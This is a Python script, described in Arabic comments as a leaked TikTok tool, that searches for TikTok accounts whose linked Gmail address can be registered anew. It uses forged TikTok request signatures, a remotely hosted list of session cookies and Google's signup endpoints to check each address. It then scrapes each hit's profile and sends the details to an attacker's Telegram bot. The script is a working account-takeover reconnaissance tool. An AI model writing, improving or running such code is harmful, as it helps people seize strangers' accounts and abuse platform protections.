# تم تسريب اداة تيك توك من اراس 
# رجاءاً لاتغير حقوق  
# يوزر مسرب @W4_M4
# يوزر قناة مسرب @pytho2n
import webbrowser
webbrowser.open('https://t.me/pytho2n')
import os
import sys
import re
import json
import random
import secrets
import string
import threading
import time
import datetime
from datetime import datetime
from re import *
from uuid import uuid4, uuid1
from user_agent import generate_user_agent
from random import choice, randrange
from concurrent.futures import ThreadPoolExecutor

# Network
import http.client
import requests
from requests import get, post
try:
    from urllib.parse import urlencode
except:
    
    os.system('pip install pycryptodome') 


try:
    import MedoSigner
except:
    os.system('pip install MedoSigner')
    
# Telegram Bot 
try:
    import telebot 
except:
    os.system('pip install telebot')
    os.system('pip install Pytelegrambotapi==3.7.7')
    os.system('clear')
    import telebot
from telebot import types


try:
    import binascii
except:
    os.system('pip install binascii')
from bs4 import BeautifulSoup
Z = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
C = "\033[1;97m"
B = '\033[2;36m'
Y = '\033[1;34m'
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
a1 = '\x1b[1;31m'
a2 = '\x1b[1;34m'
a3 = '\x1b[1;32m'
a4 = '\x1b[1;33m'
a5 = '\x1b[38;5;208m'
a6 = '\x1b[38;5;5m'
a7 = '\x1b[38;5;13m'
a8 = '\x1b[1;30m'
a9 = '\x1b[1;37m'
a10 = '\x1b[38;5;52m'
a11 = '\x1b[38;5;8m'
a12 = '\x1b[38;5;220m'
a13 = '\x1b[38;5;7m'
a14 = '\x1b[38;5;153m'
a15 = '\x1b[38;5;18m'
a16 = '\x1b[38;5;48m'
a17 = '\x1b[38;5;22m'
a18 = '\x1b[38;5;196m'
a19 = '\x1b[38;5;88m'
a20 = '\x1b[38;5;226m'
a21 = '\x1b[38;5;136m'
a22 = '\x1b[38;5;216m'
a23 = '\x1b[38;5;166m'
a24 = '\x1b[38;5;234m'
a25 = '\x1b[38;5;91m'
a26 = '\x1b[38;5;205m'
a27 = '\x1b[38;5;161m'
a28 = '\x1b[38;5;236m'
a29 = '\x1b[38;5;233m'
a30 = '\x1b[38;5;255m'
a31 = '\x1b[38;5;231m'
a32 = '\x1b[38;5;180m'
a33 = '\x1b[38;5;94m'
a34 = '\x1b[38;5;252m'
a35 = '\x1b[38;5;246m'
a36 = '\x1b[38;5;228m'
a37 = '\x1b[38;5;172m'
a38 = '\x1b[38;5;188m'
a39 = '\x1b[38;5;247m'
a40 = '\x1b[38;5;117m'
M = '\x1b[1;37m'
pink_t5ok5 = '\x1b[38;5;199m'
WHITE_BOLD = '\x1b[1;97m'
reset = '\x1b[0m'

HH = random.choice([a1, a2, a3, a4, a5, a14, a18, a20, a21, a22, a23, a26, a27, a37, a38, a40 ,Y ,C,M,pink_t5ok5,a28,a27,a29])
print(HH)

b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
E = '\033[1;31m'  # أحمر ساطع
Y = '\033[1;33m'  # أصفر ساطع
Z = '\033[1;31m'  # أحمر
X = '\033[1;33m'  # أصفر
Z1 = '\033[2;31m' # أحمر خافت
F = '\033[2;32m'  # أخضر
A = '\033[2;34m'  # أزرق
C = '\033[2;35m'  # وردي
S = '\033[2;36m'  # سمائي
G = '\033[1;34m'  # أزرق فاتح
HH = '\033[1;34m' # أزرق فاتح (مكرر)
M = '\x1b[1;37m'  # أبيض


hit, ge, be, gt, bt = 0, 0, 0, 0, 0

def aras():
    print(f"""                                 	
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝

            {a26}.•´¯`•.¸¸ {F} تم تسريب من اراس @W4_M4 {a36}¸.•´¯`•.¸¸              
            
               {a31}TLE : @W4_M4 / @pytho2n 
                     
""")

aras()
iid = input('\x1b[38;5;180m ID : ')
tok = input('\x1b[38;5;180m Token  : ')



def info(email):
    global hit, iid, tok
    hit += 1
    email = str(email)
    user = email.split('@')[0]
    
    try:
        r = requests.get(f"https://www.tiktok.com/@{user}", 
                         headers={"User-Agent":"Mozilla/5.0"}).text
        
        # Check if user-detail section is present
        if 'webapp.user-detail"' not in r:
            ff = f'''
✦ 𝙃𝙞𝙩 : {hit}
✦ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 : {user}
✦ 𝙀𝙢𝙖𝙞𝙡 : {email}
• تم تسريب من اراس : @W4_M4
• قناة المسرب : @pytho2n
            '''
            requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(ff))
            return
        
        g = r.split('webapp.user-detail"')[1].split('"RecommendUserList"')[0]
        
        
        def extract_value(key, end='",'):
            if f'{key}":"' in g:
                return g.split(f'{key}":"')[1].split(end)[0]
            return ''
        
        # Extracting user details
        id = extract_value('id')
        name = extract_value('nickname')
        bio = extract_value('signature')
        country = extract_value('region')
        private = extract_value('privateAccount')
        followers = extract_value('followerCount')
        following = extract_value('followingCount')
        like = extract_value('heart')
        video = extract_value('videoCount')
        
        # Calculate creation year from ID
        created_year = ""
        if id:
            try:
                
                binary_id = "{0:b}".format(int(id))[:31]
                timestamp = int(binary_id, 2)
                c = datetime.fromtimestamp(timestamp)
                created_year = c.year
            except:
                created_year = "" 
        
        
        ff = f'''
✦•···········•✦ 𝑨𝑹𝑨𝑺 ✦•···········•✦

💠 𝗛𝗜𝗧 : {hit}
💠 𝗡𝗔𝗠𝗘 : {name}
💠 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : {user}
💠 𝗘𝗠𝗔𝗜𝗟 : {email}
💠 𝗜𝗗 : {id}
💠 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 : {followers}
💠 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 : {following}
💠 𝗟𝗜𝗞𝗘𝗦 : {like}
💠 𝗩𝗜𝗗𝗘𝗢𝗦 : {video}
💠 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 : {country}
💠 𝗕𝗜𝗢 : {bio}
💠 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 : {private}
💠 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 : {created_year}

✦•···········•✦ 𝑨𝑹𝑨𝑺 ✦•···········•✦
• تم تسريب من اراس : @W4_M4
• قناة المسرب : @pytho2n
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(ff))
        
    except Exception as e:
  
        ff = f'''
✦•···········•✦ 𝑨𝑹𝑨𝑺 ✦•···········•✦
💠 𝗛𝗜𝗧 : {hit}
💠 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : {user}
💠 𝗘𝗠𝗔𝗜𝗟 : {email}
✦•···········•✦ 𝑨𝑹𝑨𝑺 ✦•···········•✦
• تم تسريب من اراس : @W4_M4
• قناة المسرب : @pytho2n
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(ff))



def Gmail(email):
    global hit, ge, be, gt, bt
    

    if '@' in email:
        email = email.split('@')[0]
        
    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
        return False
        
    
    name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5, 10)))
    birthday = random.randrange(1980, 2010), random.randrange(1, 12), random.randrange(1, 28)
    s = requests.Session()


    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-browser-channel': 'stable',
        'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
        'x-browser-year': '2024',
    }

    params = {
        'biz': 'false',
        'continue': 'https://mail.google.com/mail/u/0/',
        'ddm': '1',
        'emr': '1',
        'flowEntry': 'SignUp',
        'flowName': 'GlifWebSignIn',
        'followup': 'https://mail.google.com/mail/u/0/',
        'osid': '1',
        'service': 'mail',
    }

    response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
    tl = response.url.split('TL=')[1]
    s1 = response.text.split('"Qzxixc":"')[1].split('"')[0]
    at = response.text.split('"SNlM0e":"')[1].split('"')[0]
    
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name, at)

    s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }
    
    # Data string structure is complex and must be preserved exactly
    data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLAzMyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0], birthday[1], birthday[2], at)

    s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text

    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'NHJMOd',
        'source-path': '/lifecycle/steps/signup/username',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email, at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text

    
    if "password" in response:
        info(email) 
        os.system('cls' if os.name == "nt" else "clear")
        ge += 1
        aras()
        print(f"\r          {A}T r u e {F}: {M}{ge}  {Z}F a l s e {F}: {M}{bt}  {X}N o t {a13}: {M}{be} {G}\r")
    else:
        os.system('cls' if os.name == "nt" else "clear")
        be += 1
        aras()
        print(f"\r          {A}T r u e {F}: {M}{ge}  {Z}F a l s e {F}: {M}{bt}  {X}N o t {a13}: {M}{be} {G}\r")



def sign_tiktok(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
    
    from MedoSigner import Argus, Gorgon, md5, Ladon
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
    data = payload
    if not unix: unix = int(time.time())
    return Gorgon(params, unix, payload, cookie).get_value() | {"x-ladon": Ladon.encrypt(unix, license_id, aid), "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)}



def check_tiktok_email(email):
    global hit, ge, be, gt, bt
    
    try:
        
        response = requests.get('https://raw.githubusercontent.com/aahh2009731-web/nsjsjzixnskwnwsixixixhhxiizjzsnwjs/main/github.txt')
        sessions_list = response.text.splitlines()
        session_id = choice(sessions_list)
        
       
        ARAS1 = random.choice(["inapp.tiktokv.com", "api2.musical.ly", "api16-normal-c-alisg.tiktokv.com", "api2-19-h2.musical.ly"])
        url = f'https://{ARAS1}/passport/email/bind_without_verify/?passport-sdk-version=0&app_language=en&&iid=7410413249743685382&ac=WIFI&channel=googleplay&aid=1233&app_name=musical_ly&version_code=310503&version_name=31.5.3&device_platform=android&os=android&ab_version=31.5.3&ssmix=a&device_type=Infinix+X6816&device_brand=Infinix&language=en&os_api=30&os_version=11&openudid=36dd31864f68ff6f&manifest_version_code=2023105030&resolution=720*1568&dpi=303&update_version_code=2023105030&_rticket=1726064910254&is_pad=0&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=en&carrier_region=IQ&ac2=wifi5g&uoo=0&op_region=IQ&timezone_offset=10800&build_number=31.5.3&host_abi=arm64-v8a&locale=en&region=IQ&content_language=en%2C&ts=1722418819&cdid=556d8162-2721-4760-a509-a92b3cf27738&support_webview=1&cronet_version=2fdb62f9_2023-09-06&ttnet_version=4.2.152.11-tiktok&use_store_region_cookie=1'

        params = {
            "device_platform": "android",
            "aid": "1233",
            "version_code": "0",
            "version_name": "0",
            'device_id': str(randrange(1, 10 ** 19)),
        }

        m = sign_tiktok(params=urlencode(params), payload="", cookie="")

        headers = {
            'sdk-version': '2',
            'user-agent': 'com.zhiliaoapp.musically/2021306050 (Linux; U; Android 13; ar; ANY-LX2; Build/HONORANY-L22CQ; Cronet/TTNetVersion:57844a4b 2019-10-16)',
            'x-argus': m["x-argus"],
            'x-ladon': m["x-ladon"],
            'x-khronos': m["x-khronos"],
            'x-gorgon': m["x-gorgon"],
        }

        data = {"email": email}
       
        res = requests.post(url, headers=headers, data=data, params=None, cookies={"sessionid": session_id}).text
        print(res)
        
        if "1023" in res:
            Gmail(email) 
            os.system('cls' if os.name == 'nt' else 'clear')
            gt += 1
            aras()
            print(f"\r          {A}T r u e {F}: {M}{ge}  {Z}F a l s e {F}: {M}{bt}  {X}N o t {a13}: {M}{be} {G}\r")
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            bt += 1
            aras()
            print(f"\r          {A}T r u e {F}: {M}{ge}  {Z}F a l s e {F}: {M}{bt}  {X}N o t {a13}: {M}{be} {G}\r")
            
    except Exception as e:
        print(f"Error checking TikTok email: {e}")
        os.system('cls' if os.name == 'nt' else 'clear')
        bt += 1
        aras()
        print(f"\r          {A}T r u e {F}: {M}{ge}  {Z}F a l s e {F}: {M}{bt}  {X}N o t {a13}: {M}{be} {G}\r")



def admin_gmail(name):
    try:
        file = open(name, 'r').read().splitlines()
    except:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(Z + "File Not Found")
        return
    

    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = [executor.submit(check_tiktok_email, user.strip() + "@gmail.com") for user in file if user.strip()]
        for future in futures:
            future.result()



def aras13():

    try:
        os.system("cls" if os.name == "nt" else "clear")
        aras()
        name = input(F"\x1b[38;5;180m💠 Enter File Name : " + M)
        admin_gmail(name)
    except Exception as e:
        print(M + f"Error Code : 5101 - {e}")


if __name__ == "__main__":
    aras13()
